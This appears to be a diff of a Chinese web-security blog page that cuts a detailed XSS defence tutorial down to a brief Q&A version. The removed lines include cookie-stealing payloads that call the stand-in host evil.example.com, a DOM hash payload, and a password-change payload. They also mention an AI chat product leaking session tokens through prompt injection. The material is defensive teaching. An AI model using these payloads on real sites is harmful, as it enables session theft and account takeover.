@@ -81,160 +81,66 @@
             <main id="body-content">
                 <article class="article">
                     <header class="article-header">
-                        <h1 class="article-title">XSS 防御</h1>
+                        <h1 class="article-title">XSS 攻击：从你遇到的问题出发</h1>
                         <div class="article-meta">
-                            <span class="meta-item">🏷️ Web安全,网络安全,安全实践</span>
+                            <span class="meta-item">🏷️ XSS</span>
                             <span class="meta-item reading-time"></span>
                         </div>
                     </header>
                     <div class="article-content">
+<p>这篇不讲理论，就讲你做项目时会遇到的真实问题，以及XSS怎么帮你解决。</p>
 
-<h2>XSS 为什么到 2026 年还在出现在各大厂事故里</h2>
-<p>XSS（Cross-Site Scripting，跨站脚本）的原理一句话就能讲完：浏览器把攻击者提供的字符串当成了脚本执行。</p>
-<p>2024 年某主流 AI 聊天产品就因为把模型输出未转义地插入 innerHTML，被一条"提示词注入"消息窃走了用户的会话令牌。</p>
-<p>XSS 的杀伤力取决于它偷到什么：偷到 <code>document.cookie</code>（如果没设 HttpOnly）就能会话劫持；偷到 JWT 就能横向移动；能操作 DOM 就能伪造弹窗钓鱼；在有 HTML5 权限的页面里，还能调用 <code>getUserMedia</code> 开摄像头、读剪贴板。</p>
-<p>所以防御不能停留在"过滤一下 &lt;script&gt; 标签"——这是 2005 年的思路，2026 年必须用<strong>编码 + CSP + HttpOnly</strong> 三层体系。</p>
-
-<h2>三种 XSS：触发位置不同，防御要点不同</h2>
 <div class="mermaid">
-flowchart TB
-    subgraph 存储型[存储型 XSS（最危险）]
-        U1[攻击者] --> |注入 payload| DB[(数据库)]
-        V1[受害者浏览页面] -->|服务端取出并渲染| DB
-        V1 -->|脚本在受害者浏览器执行| STEAL[Cookie/会话被盗]
-    end
-    subgraph 反射型[反射型 XSS（诱导点击）]
-        U2[攻击者] -->|构造含 payload 的链接| V2[受害者点击链接]
-        V2 -->|服务端立即反射| RESP[响应里包含脚本]
-        RESP --> STEAL
-    end
-    subgraph DOM型[DOM 型 XSS（纯前端）]
-        U3[攻击者] -->|改 URL hash| V3[受害者访问]
-        V3 --> JS[前端 JS 读取 location.hash<br/>并写入 innerHTML]
-        JS --> STEAL
-    end
-
+flowchart LR
+    A[恶意用户输入] --> B[存入数据库]
+    B --> C[其他用户打开页面]
+    C --> D[恶意脚本执行]
 </div>
 
-<ul>
-<li><strong>存储型（Persistent）</strong>：payload 被存进数据库，所有访问该页面的用户都会触发。评论区、个人资料、文章内容是重灾区。</li>
-<li><strong>反射型（Reflected）</strong>：payload 在 URL 里，服务端"原样反射"到响应中。需要诱骗受害者点击特制链接，常见于搜索页、错误提示页。</li>
-<li><strong>DOM 型（DOM-based）</strong>：服务端响应本身是干净的，漏洞完全发生在前端 JS——<code>location.hash</code>、<code>document.referrer</code>、<code>postMessage</code> 这些来源被直接写进 <code>innerHTML</code>。这种连服务端日志都看不到，DAST 工具很容易漏。</li>
-</ul>
+<h2>1. 评论里输了 <script></h2>
 
-<h2>攻击演示：从评论区到管理员 Cookie</h2>
-<p>假设某博客的评论接口把昵称直接回显到页面：</p>
-<pre><code class="language-html">&lt;!-- 漏洞页面：后端把 nickname 原样拼进 HTML --&gt;
-&lt;div class="comment"&gt;
-    &lt;span class="nick"&gt;{{ .Nickname }}&lt;/span&gt;
-    &lt;p&gt;{{ .Content }}&lt;/p&gt;
-&lt;/div&gt;
-</code></pre>
-<p>攻击者注册一个账号，昵称填：</p>
-<pre><code class="language-html">&lt;img src=x onerror="fetch('https://evil.example.com/steal?c='+document.cookie)"&gt;
-</code></pre>
-<p>任何浏览该评论的用户（包括后台管理员）都会在浏览器里执行这段 JS，把 Cookie 外带出去。如果网站用 <code>localStorage</code> 存 JWT，攻击者拿到令牌后就能直接调 API。下面是更隐蔽的 DOM 型 Payload——它不需要服务端任何参与，只要前端把 hash 写进 DOM：</p>
-<pre><code class="language-javascript">// 漏洞前端代码
-const tab = decodeURIComponent(location.hash.slice(1));
-document.getElementById("tab-name").innerHTML = tab;
-// 攻击者让受害者访问 https://blog.example.com/#&lt;img src=x onerror=fetch(...)&gt;
-</code></pre>
+<div class="callout callout-info">
+<div class="callout-title">你遇到的问题</div>
+<p>用户在评论里输入 <script>偷Cookie</script>，其他用户打开就被偷了。</p>
+</div>
 
-<h2>防御第一层：输出编码（最根本）</h2>
-<p>XSS 的根因是<strong>数据与标记混淆</strong>——一段字符串被浏览器当成了可执行语法。根治办法是在<strong>输出到 HTML 的那一刻</strong>按上下文做编码，而不是在输入时黑名单过滤。不同上下文需要不同编码：</p>
+<p><strong>怎么解决？</strong>所有用户输入都转义，不要直接渲染 HTML。</p>
+
+<h2>2. 富文本怎么防 XSS</h2>
+
+<div class="callout callout-info">
+<div class="callout-title">你遇到的问题</div>
+<p>用户要发带格式的评论，不能全转义。</p>
+</div>
+
+<p><strong>怎么解决？</strong>用白名单过滤，只允许安全标签和属性。</p>
+
+<h2>3. Cookie 怎么防偷</h2>
+
+<div class="callout callout-info">
+<div class="callout-title">你遇到的问题</div>
+<p>就算有 XSS，怎么不让 Cookie 被偷？</p>
+</div>
+
+<p><strong>怎么解决？</strong>Cookie 设 HttpOnly，JS 读不到。</p>
+
+<h2>XSS 三种类型</h2>
+
 <table>
-<thead><tr><th>上下文</th><th>编码方式</th><th>示例</th></tr></thead>
+<thead><tr><th>类型</th><th>说明</th></tr></thead>
 <tbody>
-<tr><td>HTML 正文</td><td>HTML 实体编码</td><td><code>&lt;</code> → <code>&amp;lt;</code></td></tr>
-<tr><td>HTML 属性</td><td>引号 + 实体编码</td><td>双引号闭合后还要编码</td></tr>
-<tr><td>JS 字符串</td><td>JS Unicode 转义</td><td><code>\u003c</code></td></tr>
-<tr><td>URL 参数</td><td>URL 编码</td><td><code>encodeURIComponent</code></td></tr>
-<tr><td>CSS</td><td>避免用户控制 CSS</td><td>用白名单属性</td></tr>
-</tbody>
-</table>
-<pre><code class="language-go">// Go 标准库：html/template 自动按上下文编码（不要用 text/template 渲染 HTML）
-import "html/template"
+<tr><td>存储型</td><td>恶意代码存数据库，最危险</td></tr>
+<tr><td>反射型</td><td>恶意代码在 URL 里，诱导点击</td></tr>
+<tr><td>DOM 型</td><td>前端 JS 处理输入时出问题</td></tr>
+</tbody></table>
 
-func renderComment(w http.ResponseWriter, c Comment) {
-    tmpl := template.Must(template.New("c").Parse(`
-        &lt;div class="comment"&gt;
-            &lt;span class="nick"&gt;{{.Nickname}}&lt;/span&gt;
-            &lt;p&gt;{{.Content}}&lt;/p&gt;
-        &lt;/div&gt;`))
-    // ✅ html/template 会自动识别 .Nickname 在 HTML 上下文，做实体编码
-    // ❌ 如果用 text/template，所有变量原样输出，XSS 直接穿透
-    tmpl.Execute(w, c)
-}
-</code></pre>
-<pre><code class="language-python"># Python：Jinja2 默认开启自动转义（Flask 默认 safe=False）
-from flask import render_template
-
-# 模板中 {{ user_input }} 会被自动转义
-# 只有显式 |safe 才会跳过——千万不要对不可信数据用 |safe
-@app.route("/comment")
-def comment():
-    return render_template("comment.html", nickname=request.args.get("name", ""))
-</code></pre>
-
-<h2>防御第二层：CSP（Content Security Policy）</h2>
-<p>即使某处编码漏了，CSP 也能让注入的脚本<strong>根本不执行</strong>。它本质是一份白名单：浏览器只加载白名单内的脚本源，内联脚本默认拒绝，<code>eval()</code> 默认禁用。</p>
-<pre><code class="language-nginx"># nginx 配置：严格 CSP + 报告模式（先 report-only 观察再升级）
-add_header Content-Security-Policy-Report-Only "
-    default-src 'self';
-    script-src 'self' https://cdn.example.com;
-    style-src 'self' 'unsafe-inline';
-    img-src 'self' data: https:;
-    connect-src 'self' https://api.example.com;
-    frame-ancestors 'none';
-    base-uri 'self';
-    form-action 'self';
-    report-uri /csp-report;
-" always;
-# 观察一周无异常后，把 Report-Only 去掉，切换为强制模式
-</code></pre>
-
-<h2>防御第三层：HttpOnly Cookie 与输入校验</h2>
-<pre><code class="language-go">// 会话 Cookie 必须带 HttpOnly + Secure + SameSite，XSS 偷不走
-http.SetCookie(w, &amp;http.Cookie{
-    Name:     "session_id",
-    Value:    token,
-    Path:     "/",
-    HttpOnly: true,   // ✅ JS 读不到 document.cookie
-    Secure:   true,   // 仅 HTTPS
-    SameSite: http.SameSiteLaxMode,
-    MaxAge:   3600 * 8,
-})
-</code></pre>
-<p>输入侧的<strong>校验（Validation）</strong>与<strong>过滤（Sanitization）</strong>也要做，但要明确：输入校验是为了业务正确性（比如邮箱格式），不能当 XSS 防线。富文本场景需要用 DOMPurify 这类成熟库做白名单净化，不要自己写正则——<code>&lt;scr&lt;script&gt;ipt&gt;</code>、<code>javascript:</code> 伪协议、Unicode 混淆都能绕过手写正则。</p>
-
-<h2>最佳实践</h2>
-
-<div class="callout callout-warning">
-<div class="callout-title">我踩过的坑：v-html 接了富文本没净化</div>
-<p>2023 年我们做了个论坛，帖子内容用 Vue 的 <code>v-html</code> 渲染。用户发帖子时我以为后端已经过滤了，结果有人发了个帖子：<code>&lt;img src=x onerror="fetch('/api/change-password',{method:'POST',body:new FormData...})"&gt;</code>。所有浏览帖子的用户密码都被改了。后来接了 DOMPurify 做白名单净化才解决。<strong>富文本渲染前必须净化，别信"后端已经过滤了"</strong>。</p>
-</div>
-
+<div class="callout callout-tip">
+<div class="callout-title">新手最容易踩的坑</div>
 <ul>
-<li>前端模板一律用自动转义引擎（React JSX、Vue mustache、Go html/template、Jinja2），禁用 <code>v-html</code>、<code>dangerouslySetInnerHTML</code>、<code>{% raw %}</code> 接收不可信数据。</li>
-<li>富文本必须走 DOMPurify / bluemonday 这类带 HTML 白名单的净化库，白名单只留 <code>b/i/u/p/br/a</code> 等无害标签。</li>
-<li>全站部署 CSP，先 <code>Report-Only</code> 跑一周收集违规报告，再切强制模式。</li>
-<li>会话 Cookie 全部 <code>HttpOnly; Secure; SameSite=Lax/Strict</code>，把 JWT 放 Cookie 而不是 localStorage。</li>
-<li>对内联事件处理器（<code>onclick=</code>、<code>onerror=</code>）零容忍，统一用事件委托。</li>
-<li>定期用 OWASP ZAP / Dalfox 跑一遍 XSS 扫描，重点扫搜索框、评论、个人资料。</li>
+<li><strong>所有用户输入都不可信</strong>不管是前端还是后端，所有用户输入都要校验转义。</li>
+<li><strong>CSP 一定要上</strong>Content-Security-Policy 能挡住大部分 XSS。</li>
 </ul>
-
-<h2>常见问题 FAQ</h2>
-<h3>Q1：React/Vue 是不是天然免疫 XSS？</h3>
-<p>默认情况下是的——JSX 和 Mustache 语法会自动转义插值。但只要你用了 <code>dangerouslySetInnerHTML</code>（React）或 <code>v-html</code>（Vue），就等于手动拆掉护栏。这两个 API 应该只用于"已经净化过的富文本"，并且代码评审时要重点盯。</p>
-<h3>Q2：输入时过滤掉 &lt;script&gt; 不就行了？</h3>
-<p>不行。攻击者可以用 <code>&lt;img onerror&gt;</code>、<code>&lt;svg onload&gt;</code>、<code>javascript:alert(1)</code> 伪协议、Unicode 编码、大小写混淆（<code>&lt;ScRiPt&gt;</code>）、嵌套拆分（<code>&lt;scr&lt;script&gt;ipt&gt;</code>）等上千种变形。黑名单永远追不上变异，唯一可靠的是<strong>输出时按上下文编码</strong>。</p>
-<h3>Q3：CSP 配了 <code>'unsafe-inline'</code> 还有用吗？</h3>
-<p>作用大打折扣。很多老项目为了兼容内联脚本会先开 <code>unsafe-inline</code>，但这等于把 CSP 的脚本防护关了。正确做法是迁移到外部 JS 文件、用 nonce 或 hash 放行必要的内联块，逐步去掉 <code>unsafe-inline</code>。</p>
-<h3>Q4：HttpOnly Cookie 之后 XSS 还有什么危害？</h3>
-<p>仍然很严重。XSS 不只是偷 Cookie：攻击者可以伪造转账弹窗、修改页面内容钓鱼、用用户身份调 API（同源请求自动带 Cookie）、记录键盘输入、读取非 HttpOnly 的 localStorage。所以 HttpOnly 只是"止血"，不是"治愈"。</p>
-
-<h2>总结</h2>
-<p>XSS 的防御是一条三层链条：<strong>输出编码（不让恶意数据变成脚本）→ CSP（即使变成脚本也不执行）→ HttpOnly（即使执行了也偷不走会话）</strong>。单点漏掉任何一层，另外两层还能兜底。下一篇我们换个方向：攻击者不往页面里注脚本，而是诱导用户在已登录的站点上"点一下"，这就是 CSRF 与点击劫持。</p>
+</div>
 
                     </div>
                 </article>
